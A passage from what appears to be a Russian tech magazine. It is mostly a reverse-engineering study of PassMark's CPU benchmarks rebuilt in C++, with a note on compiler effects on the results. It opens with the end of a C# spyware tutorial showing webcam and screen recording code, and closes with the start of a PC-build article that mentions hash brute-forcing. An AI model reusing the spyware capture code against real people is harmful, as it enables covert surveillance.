    VideoCaptureDevice videoSource = new VideoCaptureDevice(
videoDevices[0].MonikerString);
    videoSource.NewFrame += video_NewFrame;
    videoSource.Start();
    return videoSource;
}


static void video_NewFrame(object sender, NewFrameEventArgs eventArgs
)
{
    lock (webcamFrameLock)
    {
        webcamFrame?.Dispose();
        webcamFrame = (Bitmap)eventArgs.Frame.Clone();
    }
}

Затем программа ждет 20 секунд, видео пишет ся, после чего потоки при-
останав ливаются, а получен ная запись сохраняется в файл.


    Thread.Sleep(20000); // Двадцать секунд для записи


    isRecording = false;
    videoSource.SignalToStop();
    videoSource.WaitForStop();
    screenThread.Join();


    writer.Close();
    Console.WriteLine("Recording finished.");
}

Запускаем — и в каталоге с прог раммой видим заветный видеоро лик!





                          Успешный захват


ÂÛÂÎÄÛ

Не зря любая книжка по WinAPI для начинающих первым делом рассказывает
о графике! И не зря в вузе столько времени показывали C# и механизм его
работы. Совместив разрознен ные знания, мож но писать сложные и необыч-
ные шту ки, в том числе полноценную спайварь. Глав ное — помни, что делаем
мы это стро го в целях обу чения, а применять если и будем, то в рамках кон-
тракта с кли ентом. Без это го распространение подобных программ может
при вести к печальным последствиям, а не только к лул зам.
КОДИНГ





Существуют сот ни прог рамм для оцен ки
про изводитель нос ти,   но   абсо лютным
лидером  сре ди   них  можно   назвать
PassMark —  «индус триальный  стандарт
с 1998 года», как его позиционирует сам             AseN                                                                                            Reverse Engineer, IT
разработчик.  На  сай те  прог раммы —               Entrepreneur                                                                                                 antochi.anton@ya.ru
огромная база оценок самых разных девай-
сов.  Давай  пос мотрим,  что  находится
под капотом  у  легендарной программы
для бен чмар ков.


В этой статье мы изучим алго ритмы тестирования PassMark и воспроизведем
их самос тоятельно на других языках прог раммирова ния, чтобы получить
незави симую оцен ку про изводительнос ти.


ÎÁÙÈÉ ÎÁÇÎÐ ÐÀÁÎÒÛ PASSMARK

Ес ли зай ти на официаль ную страницу заг рузки PassMark, мы увидим, что
программа эта кросс-платформен ная. На первый взгляд может показаться,
что она собирается из единой кодовой базы (по крайней мере, ядро
с набором бенчмарков), одна ко это не так — исходный код, как и интерфейс,
сильно разнятся от плат формы к платформе. Тем не менее работа ющее
под управле нием разных ОС приложение оце нивает производительность
при мерно оди наково (в ходе ауди та мы проверим, так ли это на самом деле).





                           PassMark macOS





                             Windows

Windows-версия PassMark,  к примеру, представлена в виде мно жества
исполняемых фай лов под каж дую группу тестов, а версия для macOS —
как standalone-файл, содер жащий в себе сразу все тесты.





             Файловая структура PassMark в Windows

При запуске любого теста приложение PassMark вне зависи мости от плат-
формы порождает новые процес сы в количес тве, соответствующем чис лу
ядер про цессора, для достижения максимальной загрузки CPU — по одному
про цессу на каж дое ядро. Пос ле отработки каждого процесса программа
собирает целочисленные результаты для дальнейшего суммирования.
  Способы порож дения новых процес сов на разных платформах отличают-
ся. В macOS делается форк основно го про цес са PassMark, а в Windows
запускается отдельный процесс PT-CPUTest с параметрами командной стро-
ки, позволяющи ми кон тролировать длительность тес та по времени и число
используемых ядер про цес сора:


PT-CPUTest.exe [-slave|-standalone] [номер бенчмарка] [число ядер] [
длительность в миллисекундах]

Это же отличие,  кстати, поз воляет задавать число ядер в нас трой ках
Windows-версии программы и не позволяет в macOS.
   Та ким образом, способ запуска любого бен чмарка PassMark сводится
к запуску N про цессов, где N — число ядер CPU, ожи данию завершения всех
про цессов и суммированию целочисленных резуль татов от них (где каждый
результат в среднем равен суммарному результату / N, но это не всег да
так, о чем мы еще поговорим). Суммарный резуль тат — это и есть то, что
PassMark отображает в сво ей пуб личной базе для каждого устрой ства.


ÀËÃÎÐÈÒÌ ÐÀÁÎÒÛ ÁÅÍ×ÌÀÐÊÎÂ

Что бы посмотреть, как устро ены алгорит мы бенчмарков, нужно загрузить
исполняемый файл PassMark в любой дизас семблер.
  Все бенчмар ки внутри PassMark вне зависимости от платформы орга низо-
ваны следующим образом: по номеру бен чмар ка запускается нуж ный тест.
Дизассембли рованный код, запус кающий тес ты PassMark, выглядит сле-
дующим образом.





         Ди зассемблированный код запуска тестов PassMark

Каж дый бенчмарк, в свою очередь, организован так: запус кается цикл дли-
тель ностью в задан ное количество мил лисекунд (обычно 6000), на каждой
итерации бенчмар ка производится некоторое количество вычис лительных
операций (полезная наг рузка), а в конце цик ла сум ма произве денных опе-
раций делит ся на вре мя по сле дующей формуле:


результат на одно ядро = суммарное количество выполненных
вычислительных операций / затраченное время в микросекундах

Таким образом, все результаты бенчмарков на скриншоте ниже — это не что
иное, как количество вычислительных операций опре деленного типа (зависит
от бенчмарка) в микросекун ду на заданном числе ядер процес сора (по умол-
чанию — на всех ядрах).





                     Результаты бенчмар ков




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ





            ИССЛЕДУЕМ ПОПУЛЯРНЫЙ
       БЕНЧМАРК И ПИШЕМ СВОИ ТЕСТЫ





ÂÎÑÏÐÎÈÇÂÅÄÅÍÈÅ ÊÎÄÀ ÁÅÍ×ÌÀÐÊÎÂ

Приступаем к самому интерес ному. Возьмем пару бенчмарков со скриншота
выше — IntegerMathTest и FloatingPointMathTest. Воспроизводить
любые тесты луч ше всего на низкоуровневом языке программирования
без виртуальной машины, что бы сократить вычислительные затраты на тран-
сля цию кода из IL в нативный код, которая сни зит итоговый результат бен-
чмарков. Далее мы сравним результаты бен чмарков, реализован ных на C# (с
IL), а пока остановимся на C++ (без IL).
  Код бенчмар ка IntegerMathTest (С++) будет выглядеть так:


#include <iostream>
#include <vector>
#include <random>
#include <chrono>


int main() {
    // Время работы бенчмарка по умолчанию
    long long milliseconds = 6000;
    // Размер буфера чисел для бенчмарка в тесте (нужен, чтобы
избежать работы L1/L2/L3-кеша процессора)
    int randomBufferSize = 20000;


    // Заполнение буфера 32-битных чисел для участия в бенчмарке
    std::vector<int> mem1;
    std::mt19937 rnd1(777);
    for (int n = 0; n < randomBufferSize; n++) {
        int a = static_cast<int>(rnd1() % INT_MAX) << 17;
        int b = static_cast<int>(rnd1() % INT_MAX);
        int r = a + b;
        mem1.push_back(r == 0 ? 1 : r);
    }


    // Заполнение буфера 64-битных чисел для участия в бенчмарке
    std::vector<long long> mem2;
    std::mt19937 rnd2(777);
    for (int n = 0; n < randomBufferSize; n++) {
        long long a = static_cast<long long>(rnd2() % INT_MAX) << 15;
        long long b = (a + static_cast<long long>(rnd2() % INT_MAX))
<< 15;
        long long c = (b + static_cast<long long>(rnd2() % INT_MAX))
<< 15;
        long long d = static_cast<long long>(rnd2() % INT_MAX);
        long long r = c + d;
        mem2.push_back(r == 0 ? 1 : r);
    }


    // Числа, участвующие в бенчмарке, вынесены из цикла, чтобы не
тратить ресурсы на выделение памяти на каждой итерации
    int mem_index = 0;
    long long v27 = 0;
    const int addSubOpsCount = 1000;
    const int mulDivOpsCount = 500;
    int v11, v17, v4, v10, v12, v13, v18;
    long long v15, v16, v14, v8, v9, v31, i;


    // Таймер для подсчета прошедшего времени
    auto start_time = std::chrono::high_resolution_clock::now();


    while (true)
    {
        // Значения для 32-битного эксперимента
        v4 = mem1[mem_index + 1];
        v10 = mem1[mem_index + 0];
        v11 = mem1[mem_index + 2];
        v12 = mem1[mem_index + 3];
        v13 = mem1[mem_index + 4];
        v17 = mem1[mem_index + 5];
        v18 = v4;


        // Значения для 64-битного эксперимента
        v14 = mem2[mem_index + 0];
        v8 = mem2[mem_index + 1];
        v15 = mem2[mem_index + 2];
        v31 = mem2[mem_index + 3];
        i = v31;
        v9 = mem2[mem_index + 4];
        v16 = mem2[mem_index + 5];
        mem_index = (mem_index + 6) % (randomBufferSize - 6);


        int v19 = addSubOpsCount;


        // 32-битный эксперимент: сложение/вычитание (66 операций)
        do {
            v10 = (~(v11 + (v18 ^ ((v11 & (v11 + ((v11 - v18 + v10) <
< 8))) - v18))) - v18) | 0x337;
            v12 = (~(v17 + (v13 ^ ((v17 & (v17 + ((v17 - v13 + v12) <
< 8))) - v13))) - v13) | 0x337;
            v18 = (~(v11 + (v10 ^ ((v11 & (v11 + ((v11 - v10 + v18) <
< 8))) - v10))) - v10) | 0x1C9;
            v13 = (~(v17 + (v12 ^ ((v17 & (v17 + ((v17 - v12 + v13) <
< 8))) - v12))) - v12) | 0x1C9;
            v11 = (~(v10 + (v18 ^ ((v10 & (v10 + ((v10 + v11 - v18) <
< 8))) - v18))) - v18) | 0x2A1;
            v17 = (~(v12 + (v13 ^ ((v12 & (v12 + ((v12 + v17 - v13) <
< 8))) - v13))) - v13) | 0x2A1;
            --v19;
        } while (v19 > 0);


        long long v20 = addSubOpsCount;
        long long i = v31;


        // 64-битный эксперимент: сложение/вычитание (66 операций)
        for (; v20 > 0; --v20) {
            v14 = (~(v15 + (v8 ^ ((v15 & (v15 + ((v15 - v8 + v14) <<
8))) - v8))) - v8) | 0x337;
            i = (~(v16 + (v9 ^ ((v16 & (v16 + ((v16 - v9 + i) << 8)))
- v9))) - v9) | 0x337;
            v8 = (~(v15 + (v14 ^ ((v15 & (v15 + ((v15 - v14 + v8) <<
8))) - v14))) - v14) | 0x1C9;
            v9 = (~(v16 + (i ^ ((v16 & (v16 + ((v16 - i + v9) << 8)))
- i))) - i) | 0x1C9;
            v15 = (~(v14 + (v8 ^ ((v14 & (v14 + ((v14 + v15 - v8) <<
8))) - v8))) - v8) | 0x2A1;
            v16 = (~(i + (v9 ^ ((i & (i + ((i + v16 - v9) << 8))) -
v9))) - v9) | 0x2A1;
        }


        int v22 = mulDivOpsCount;


        // 32-битный эксперимент: умножение/деление (10 операций)
        do {
            v11 = v18 | (v18 * v10 * v11 * v10 * v11 / v10);
            v17 = v13 | (v13 * v12 * v17 * v12 * v17 / v12);
            --v22;
        } while (v22 > 0);


        // 64-битный эксперимент: умножение/деление (10 операций)
        for (int j = mulDivOpsCount; j > 0; --j) {
            v15 = v8 | (v8 * v14 * v15 * v14 * v15 / v14);
            v16 = v9 | (v9 * i * v16 * i * v16 / i);
        }


        // Суммирование всех операций за итерацию (66 — сложение/
вычитание, 10 — умножение/деление)
        v27 += 66 * (addSubOpsCount + addSubOpsCount) + 10 * (
mulDivOpsCount + mulDivOpsCount);


        // Если время бенчмарка подошло к концу, выйти из цикла
        auto elapsed = std::chrono::duration_cast<std::chrono::
milliseconds>(std::chrono::high_resolution_clock::now() - start_time)
.count();
        if (elapsed >= milliseconds) {
            break;
        }
    }


    auto end_time = std::chrono::high_resolution_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::
milliseconds>(end_time - start_time).count();


    // Итоговый результат = число операций в микросекунду
    double result = (static_cast<double>(v27) / elapsed) / 1000.0;


    // Выводим все значения,
        // чтобы компилятор не срезал вычисления в ходе оптимизации
    std::cout << "IntegerMath Test: " << result << " | "
        << v11 + v17 + v4 + v10 + v12 + v13 + v18 +
        v15 + v16 + v14 + v8 + v9 + v31 + i << std::endl;


    std::cin.get();
    return 0;
}

А вот код бенчмар ка FloatingPointMathTest (С++):


#include <iostream>
#include <vector>
#include <random>
#include <chrono>


int main() {
    // Время работы бенчмарка по умолчанию
    long long milliseconds = 6000;
    // Размер буфера чисел для бенчмарка в тесте (нужен, чтобы
избежать работы L1/L2/L3-кеша процессора)
    int randomBufferSize = 20000;


    // Заполнение 32-битных чисел с плавающей запятой (float) для
участия в бенчмарке
    std::vector<float> mem1;
    std::mt19937 rnd1(777);
    for (int n = 0; n < randomBufferSize; n++) {
        float a = static_cast<float>(rnd1() % INT_MAX) * 1000.0f;
        float b = static_cast<float>(rnd1() % INT_MAX) + a;
        float c = static_cast<float>(rnd1() % INT_MAX) / 10000.0f + b
;
        mem1.push_back(c == 0.0f ? 1.0f : c);
    }


    // Заполнение 64-битных чисел с плавающей запятой (double) для
участия в бенчмарке
    std::vector<double> mem2;
    std::mt19937 rnd2(777);
    for (int n = 0; n < randomBufferSize; n++) {
        double a = static_cast<double>(rnd2() % INT_MAX) * 1000.0;
        double b = static_cast<double>(rnd2() % INT_MAX) + a;
        double c = static_cast<double>(rnd2() % INT_MAX) / 10000.0 +
b;
        mem2.push_back(c == 0.0 ? 1.0 : c);
    }


    // Числа, участвующие в бенчмарке, вынесены из цикла, чтобы не
тратить ресурсы на выделение памяти на каждой итерации
    long long v4 = 0;
    float v11, r1 = 0.0f;
    double v10, r2 = 0.0;
    int v5 = 300;
    int v6 = 0;
    int v7, v8, v9;


    // Таймер для подсчета прошедшего времени
    auto start_time = std::chrono::high_resolution_clock::now();


    while (true) {
        v7 = v6;
        v8 = v6 + 1;
        v9 = v8;
        v6 = v8 + 1;
        v10 = mem2[v9];
        v11 = mem1[v9];


        // 32-битный эксперимент: сложение/вычитание/умножение/
деление (20 операций)
        r1 = (((((((((((((((((((v11 + mem1[v7]) - v11) * v11) + v11)
- v11) * v11) + v11) - v11) * v11) / v11) + v11) - v11) * v11) + v11)
- v11) * v11) + v11) - v11) * v11) / v11;
        // 64-битный эксперимент: сложение/вычитание/умножение/
деление (20 операций)
        r2 = ((((((v10 + mem2[v7] - v10) * v10 + v10 - v10) * v10 +
v10 - v10) * v10 / v10 + v10 - v10) * v10 + v10 - v10) * v10 + v10 -
v10) * v10 / v10;


        // Суммирование всех операций за итерацию (20 + 20)
        v4 += 40;


        // Бессмысленная проверка r1 и r2, чтобы компилятор не
срезал полезные вычисления в ходе оптимизации
        if(r1 == 0 && r2 == 0){
            break;
        }


        if (--v5 == 0) {
            // Если время бенчмарка подошло к концу, выйти из цикла
            auto elapsed = std::chrono::duration_cast<std::chrono::
milliseconds>(std::chrono::high_resolution_clock::now() - start_time)
.count();
            if (elapsed >= milliseconds) {
                break;
            }
            v5 = 300;
        }


        if (v6 >= 20000) {
            v6 = 0;
        }
    }


    auto end_time = std::chrono::high_resolution_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::
milliseconds>(end_time - start_time).count();


    // Итоговый результат = число операций в микросекунду
    double result = (static_cast<double>(v4) / elapsed) / 1000.0;


    // Выводим числа r1 и r2, чтобы компилятор не срезал полезные
вычисления в ходе оптимизации
    std::cout << "FloatingPointMath Test: " << result << " | " << r1
<< ", " << r2 << std::endl;
    getchar();


    return 0;
}

Код был вос становлен на основе реверс-инжиниринга PassMark под Windows
и macOS. Оба бенчмарка по структуре кода очень похожи. Универсальный
алго ритм выглядит так:
 1. Заполнить буфер случай ными числами, чтобы от итерации к итерации
   результаты вычислений не кеширо вались внут ри CPU.
 2. Запустить цикл на 6 секунд, в ходе каждой итерации которо го:
    • совершить N 32-бит ных опе раций;
    • совершить M 64-битных операций;
    • уве личить счетчик совершенных операций на N + M.
 3. Посчитать число операций в микросекунду (по формуле выше).

Здесь есть несколь ко замеча ний, которые могут быть любопытны всем, кто
интересуется сравнимостью оценки между раз личными устройствами.
 1. Разработ чики PassMark учли, что кеш процес сора сре жет реаль ные вычис-
   ления, из-за чего резуль таты будут недос товерны. Что бы обойти это,
   на каждой итерации цикла их код избы точно обращает ся к опе ративной
   памяти (буферу чисел), что при боль шом количес тве итераций (а их мно-
    го!) при ведет  к несколько занижен ным резуль татам теста. У раз ных
   устройств раз ная ско рость обращения к ОЗУ.
 2. Подсчет опе раций производится слишком усредненно: смешиваются
   в одну кучу 32- и 64-битные операции сло жения, вычитания, умножения
   и деления, хотя на уровне языка ассем блера эти опе рации, конечно же,
   неравнозначны — в идеале их нуж но сум мировать с коэффици ентом друг
   отно ситель но друга. Про цессоры раз ных устрой ств могут быть оптимизи-
   рованы под опре деленные типы опе раций.



                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ





            ИССЛЕДУЕМ ПОПУЛЯРНЫЙ
       БЕНЧМАРК И ПИШЕМ СВОИ ТЕСТЫ





ÑÐÀÂÍÅÍÈÅ ÐÅÇÓËÜÒÀÒÎÂ

Восста новленный код работает в один поток (на одном ядре), а PassMark
запускает этот же код, распараллеливая его в соответс твии с количеством
ядер процессора, поэтому для сравнения результатов необходимо либо зас-
тавить PassMark запус каться в одноядерном режиме, либо запускать наш код
в нескольких потоках. Пер вый вари ант выг лядит более привлекательным —
это не соз дает избыточную нагрузку.
   Так как набор функций PassMark отличает ся на разных платформах,
для каждой из них надо будет искать свой метод запуска на одном ядре.
В Windows, например, мож но задать число потоков (процессов, ядер) в нас-
тройках интерфейса PassMark. В macOS придется «обма нывать» PassMark
внешними способа ми — отключая ядра про цессора из терминала:


// Отключить все, кроме одного главного ядра
for I in `seq 0 48`; do sudo cpuctl offline $I; done;


// Включить все ядра обратно
for I in `seq 0 48`; do sudo cpuctl online $I; done;

На других платформах нужно искать что-то свое. Но скорее всего, метод
для macOS будет работать везде, где получит ся най ти альтернативу команде
cpuctl.
  До бившись запуска на одном ядре, мы увидим примерно оди наковые
результаты бенчмар ков.





           Резуль таты бенчмарков в «одноядерном» режиме

Ре зультаты тестов вос становленного кода на C++ сошлись с резуль татами
PassMark на том же компьютере практически идеально. Но чтобы достичь это-
го, недостаточно прос то закинуть код C++ в любую IDE и скомпилировать.
Когда совер шают ся миллиар ды ите раций, каждая допол нитель ная операция
в цик ле и «телодвижение» ком пилято ра могут выз вать «эффект бабочки»
на пути к общему результату.


ÈÃÐÛ Ñ ÊÎÄÎÌ ÁÅÍ×ÌÀÐÊÎÂ È ÎÑÎÁÅÍÍÎÑÒÈ ÐÀÁÎÒÛ
ÑÎÂÐÅÌÅÍÍÛÕ ÊÎÌÏÈËßÒÎÐÎÂ

Код, написанный на C++, ком пилиру ется в язык ассембле ра и имеет, соот-
ветствен но, не меньше различных «машин ных» представлений, чем существу-
ет архи тектур процессоров (языков ассемблера). На практике произво-
дительность скомпилированного ассемблерного кода зависит от еще боль-
шего числа параметров.


Êîìïèëÿòîð
Разные ком пиляторы генери руют различный машинный код из-за различий
алго ритмов пос троения AST-дерева.


Îïöèè êîìïèëÿòîðà
Сов ременные IDE позволяют варьировать тип сборки  (debug/release).
Debug-сбор ка отключает любые оптимизации ком пилятора для более удоб-
ной отладки, в то время как release-сборка вклю чает самые важ ные опти миза-
ции, но далеко не все воз можные. Из-за задействованных опти мизаций ком-
пилятора производительность одного и того же кода на C++ может отличать-
ся в три-четыре раза!
   Разные IDE имеют раз личные дефолтные настройки оптимизации: в Visual
Studio у режима release по умолчанию второй уро вень опти мизации (-O2),
а  IDE  CLion —  тре тий  (-O3),  из-за  чего  следующий  код бенчмарка
FloatingPointMathTest необ ходим для CLion, но необязате лен для Visual
Studio:


...
// Бессмысленная проверка r1 и r2, чтобы компилятор не срезал
полезные вычисления в ходе оптимизации
if(r1 == 0 && r2 == 0){
    break;
}
...

Этот код обязывает оптимиза тор компилято ра CLion выполнять вычисления
r1 и r2 на каждой ите рации цикла. Если же указан ный блок убрать, в ассем-
блерном коде вычис ление r1 и r2 выполнится только на последней итерации,
а на пре дыду щих будут просчитывать ся лишь переменные v7...  v11
для последней итерации, то есть напрочь срежут ся все полезные вычис-
ления, оценива ющие произво дитель ность CPU.
  Сле дующий код уже необ ходим для любого уровня оптимизации >= -O2,
пос коль ку компилятор в ходе опти мизации выб расывает все переменные,
которые никак не исполь зуются:


...
// Выводим все значения, чтобы компилятор не срезал вычисления в
ходе оптимизации
std::cout << "IntegerMath Test: " << result << " | "
    << v11 + v17 + v4 + v10 + v12 + v13 + v18 +
    v15 + v16 + v14 + v8 + v9 + v31 + i << std::endl;
...

Скорее все го, PassMark был скомпилиро ван с опцией оптимиза ции -O2, что
было под твержде но эмпирически. В ито ге результаты бенчмарков сошлись
с результатами, полученными с использованием восстановленного кода.


Ñòðóêòóðà êîäà
Каж дая избыточная опе рация в вос становленном коде (любое дополнитель-
ное усло вие, обращение к памяти, матема тическая процедура) нарушает
результаты тестов. Разработчики PassMark уже поработали с кодом своих
бенчмарков за нас и сумели организовать его структуру оптимально. Рас-
смот рим несколько инте рес ных фраг ментов.
  В IntegerMathTest алго ритм подсче та индекса буфера организован
таким обра зом:


mem_index = (mem_index + 6) % (randomBufferSize - 6);

А в FloatingPointMathTest — таким:


v8 = v6 + 1;
v6 = v8 + 1;
...
if (v6 >= 20000) {
    v6 = 0;
}

Ес ли в FloatingPointMathTest сделать так же, как в IntegerMathTest, про-
изводительность пада ет на 3–5%. А если в IntegerMathTest так же, как в
FloatingPointMathTest, про изводительность не меняется.
  Другой при мер — урод ливые реверсивные циклы в IntegerMathTest:


do {} while (v19 > 0);
...
for (; v20 > 0; --v20) {}
...
do {} while (v22 > 0);
...
for (int j = mulDivOpsCount; j > 0; --j) {

Ес ли их сделать красивы ми — for (int j = 0; j<mulDivOpsCount; j++),
то про изводительность скомпилирован ного кода при прочих рав ных обру-
шит ся на 15%!
   Кстати говоря, то, что проход цикла в обратном направлении может зна-
чительно увеличивать производительность, известно уже давно (и разработ-
чикам PassMark, оче видно, тоже). Еще в далеком 2014 году этот при ем раз-
бирал ся в статье «Повышаем производительность клиентской части веб-при-
ложения» для язы ка JavaScript — каким бы высокоуровневым ни был язык,
а простые операции вроде условий и циклов все равно конвертируются
в пример но одинако вый машинный код.


ÑÐÀÂÍÅÍÈÅ ÏÐÎÈÇÂÎÄÈÒÅËÜÍÎÑÒÈ ßÇÛÊÎÂ
ÏÐÎÃÐÀÌÌÈÐÎÂÀÍÈß Ñ ÏÎÌÎÙÜÞ ÁÅÍ×ÌÀÐÊÎÂ

Имея на руках вос станов ленный код бенчмарков PassMark, мы можем исполь-
зовать его для любых сво их экс тра вагантных нужд, в том чис ле для сравнения
про изводительности языков прог раммирования.
   Возьмем для примера си-подоб ный язык с виртуальной машиной и IL —
C# — и оце ним, насколько в нем работа с целыми и дробными числами мед-
леннее, чем в натив ном C++.
   Прогресс пре подносит много при ятных сюр призов, недос тупных еще пару
лет назад, а потому для «перево да» C++ в C# больше не нужно думать — дос-
таточно поп росить это сделать за нас ChatGPT, который справляется с подоб-
ными задачами превос ходно. Получив код бен чмар ков на C#, ком пилируем
его в release-режиме и оцениваем результаты.





                      Сравниваем C# и C++

Усреднен ный результат десяти тестов показал, что производительность C#
(язык с IL) на 6–8% ниже по сравнению с C++ (язык без IL) с точки зрения чис-
ловых операций. Из-за это го отличия для воспро изведения кода бенчмарков
и был изначально выбран C++.


ÂÛÂÎÄÛ

До начала исследова ния PassMark у меня было несколько иное представ-
ление об организации его кода: так как код бен чмарков дол жен быть оди-
наковым вне зависи мос ти от платформы (для сравнимости результатов
по публичной базе), казалось бы, наибо лее правильный способ его орга-
низации — обо собление в динами чески подклю чаемые библиоте ки, которые
существуют во всех поддерживаемых при ложением плат формах. Однако раз-
работ чики пред почли под каж дую плат форму выпускать продукт с нуля, делая
руч ной копипаст кода бен чмарков в платформенно зависимый вари ант прог-
раммы. Это при водит к тому, что для каждого бенчмарка необходимо про-
водить отдельный аудит на раз ных плат формах, что бы убедиться, что он дей-
ствительно везде работает одинаково.
  В этой статье аудит был сделан для двух ключевых тестов CPU —
IntegerMathTest  и  FloatingPointMathTest  на  платформах  Windows
и macOS. По его результатам мож но в целом предположить, что внутри оди-
наковых бенчмарков на раз ных плат формах находится оди нако вый код,
не зат ронутый оптимиза тором конкрет ного ком пилято ра и спецификой плат-
форменного ассем бле ра.
  И отдельного вни мания зас лужива ют публичные резуль таты бенчмарков
PassMark. Как уже упомина лось выше, результат любого бен чмарка —
это просто сум ма опе раций за микросекун ду со всех запущенных дочерних
про цессов в количестве ядер про цессора. Но что, если запус тить процес сов
боль ше, чем у процессора име ется ядер?
   Возьмем для при мера результаты тестов PassMark на 1, 24, 48 и 64 потока
для экспе риментального 24-ядерного Core I9-13950Hx, которые уже частично
демонстри ровались ранее.





          Ре зультаты тестов PassMark на 1, 24, 48 и 64 потока

С их помощью можно увидеть несколько интересных моментов работы
PassMark и современ ных процес соров:
 1. Ре зультаты на 24 ядра не равны результатам на одно ядро, умно женным
   на 24. Это происходит из-за того, что ядра современных процес соров
   не идентичны по про изводительности — ядра делятся на performance
   и eﬃcient.
 2. Опе рации с дробными числами в один поток могут быть быс трее опе-
   раций с целыми числами в один поток на некоторых про цессорах. Наибо-
   лее вероятное объ яснение этому — устройство performance-ядер кон-
   кретного процессора.
 3. Если запустить потоков больше, чем ядер процес сора, результаты бен-
   чмарка уве личатся на 10–25%. Это покажет нас тоящую производитель-
   ность процессора под 100%-й наг рузкой, и она не будет соответствовать
   той, что мож но увидеть в пуб личной базе данных PassMark. Пуб личная
   база PassMark собирается с устройств по все му миру со стан дартны ми
   настройками программы PassMark.
 4. Если запустить еще боль ше потоков, результаты особо не улуч шатся, что
   свидетельствует о полной загрузке про цессора.

Таким образом, мож но резюмировать, что разработ чики PassMark изрядно
пос тарались создать наибо лее универ сальную оцен ку производительности
раз личных устройств по всему миру. Но в реальнос ти же устройства могут
быть на 10–25% мощ нее усредненной пуб личной оценки, а заложенный
в  основу  бенчмар ков  алгоритм  «заг рязнен»  побочными  опе рациями,
еще боль ше занижающими реальную оценку.
  В любом случае, имея на руках алгоритм любого бенчмарка PassMark
и публичную базу резуль татов с миллионами устрой ств, можно проводить
довольно интересные иссле дования, нап ример:
 1. Сколь ко целочисленных операций на C# в среде Mono из Unity сможет
   выполнить iPhone 14 Pro Max? А нас колько больше, если перепи сать код
   на C++? Сто ит ли оно того?
 2. Какой лучше выб рать язык для раз работки серверного приложения с боль-
  шим числом операций с плавающей точкой на базе процес сора Xeon
   Bronze 3204: Python или JavaScript?

На эти и другие подобные вопросы можно будет получить ответ путем нехит-
рых манипуляций с результатами тес тов, выполненных с использовани ем раз-
ных язы ков прог рамми рова ния и устрой ств.
GEEK





Однажды  мне  понадо бился  компь ютер
для квантово-химических рас четов, и я пос-
тавил перед собой цель самостоятельно
собрать машину, которая вписалась бы
в бюджет 100–150 тысяч рублей. Однако            Candidum                                                                                               duospirit@gmail.com
этот компьютер неп лохо подходит и для
других задач, поэтому ради эксперимен та
попробуем побрутить на нем хеши.


Все персоналки, ори енти рован ные на сложные вычисления, име ют сильный
перекос в сто рону количес тва памяти, как оперативной, так и дис ковой.
В сво ем про екте я применил ряд спорных решений, обусловленных желанием
сохранить баланс меж ду  апгрейдоп ригодностью, вычис лительной мощ-
ностью и ценой. Что из этого получилось, я подробно расскажу в сегод-
няшней статье.


ÍÀ ×ÅÌ ÑÅÉ×ÀÑ Ñ×ÈÒÀÞÒ

Спе циально для науч ных вычислений соз даны суперкомпьютеры, например
суперкомпьютер  Курчатовского  института  или  «Ломоносов-2»  в  МГУ.
Под расчеты обычно выделяют одну ноду, и это в целом весьма недур ной
вари ант. Но тут есть и свои нюансы, скажем при вяз ка к определенному соф ту
и некото рые адми нистра тивные моменты. С дру гой стороны, и плюс солид-
ный — не надо настраивать среду.
  Мно гие используют свои вычислительные мощности, и тут можно встре-
тить целый зоопарк разнообразных устройств. Обычно это что-то напоми-
нающее ноду супер компьютера, то есть одно- или двухпро цессорная сис-
тема с камнями типа E5 2680v3/v4 и памятью от 64 Гбайт. Иногда попадается
старье типа Xeon X5650, но это уже пережиток прошлого. Впрочем, ученые
достаточно кон сервативны, поэтому обо рудование часто служит десятки лет.
Прав да, с компьюте рами этот фокус обычно не про ходит.
  В «бытовом» сегменте несколько лет назад очень круто смотрелся AMD
Ryzen Threadripper 3970x и старшие модели в связке с 256 Гбайт DDR4 3200.
Впро чем, этот процессор и сейчас выглядит неплохо, как говорится —
дорого-богато. Также определенной популярностью пользуются AMD Ryzen
9 5950X, Intel i9-12900k и млад шие модели, в обоих слу чаях компьютер осна-
щают 64 Гбайт оператив ки. Но у бытовых решений есть одна неприятная
проблема: подобные про цессоры не рассчитаны на высокую круглосуточную
наг рузку. Нап ример, я слышал нес колько печальных историй о смерти
от перег рева неудачно соб ранного дес ктопа на Threadripper. Комп помер
на вто рые сутки, причина — слабая система охлаждения.
   Вто рая проблема бытовых процев — малый объем поддерживаемой
памяти, тут разве что Threadripper поз воляет разгуляться, осо бенно старшие
модели, а для прочих потолок обычно сос тавля ет 64 Гбайт. В принципе,
такого объ ема хватает практически на все задачи, но в уме приходится дер-
жать, что методы типа DLPNO-CCSD(T) или STEOM-DLPNO-CCSD могут оказать-
ся такому аппарату не по зубам.


ÐÅÊÎÌÅÍÄÀÖÈÈ ÏÎ ÊÎÍÔÈÃÓÐÀÖÈÈ

В сети не очень много рекомендаций, как собрать компьютер для науч ных
рас четов, тем не менее они есть. Нап ример, такую инструкцию можно най ти
на фо руме ORCA (недос тупен с российских IP), и рекомендации эти довольно
прос тые: всего, и побольше. В пер вую очередь, конечно, оператив ной
памяти, общепринятым минимумом считают 64 Гбайт. Можно использовать
и 32, и даже 16, но тог да при дет ся очень тща тель но подбирать методы
и задачи, так как при любом неудачном стечении обсто ятельств все будет
падать из-за нехватки оперативки.
  Впрочем, полу эмпирике и простым DFT-методам с небольшим базисом
должно хватить скром ных объемов RAM, но это скорее учеб ные задачи.
Вообще, памяти дол жно быть 256 Гбайт, а еще луч ше 512, в таком случае
тебе будут дос тупны практически все широко исполь зуемые методы.
   Что же касается процессора, то лучше меньше ядер с высокой тактовой
частотой, чем наобо рот. Тем не менее квантово-химический софт — это не
игры, и он, разуме ется, заточен под много потоков, поэтому приведенную
выше рекомен дацию следует понимать как «16 быстрых ядер лучше 22 мед-
ленных».
   Также очень желателен быстрый SSD на 512 Гбайт и более. Вер нее, так:
для DFT 512 Гбайт хва тит с запасом, а вот для методов post HF край не
желательно иметь больше 1 Тбайт (на моей памяти больше 5 Тбайт пока
не отъедало). На худой конец сойдет и RAID 0 на HDD, что, конечно, просадит
скорость, но работать будет. Очень хороший свод рекомендаций по сборке
такого компьюте ра публику ет исследова тель из Пекинского универ ситета
под ником Sobereva.
  Причем эти рекомендации приводятся за последние несколько лет и раз-
биты по годам: любопытно смотреть, как рас тут аппе титы. В целом автор
очень рату ет за исполь зование б/у серверных компонен тов, дабы не раз-
базари вать казенные день ги на переп лату вендорам. Текущая рекомен-
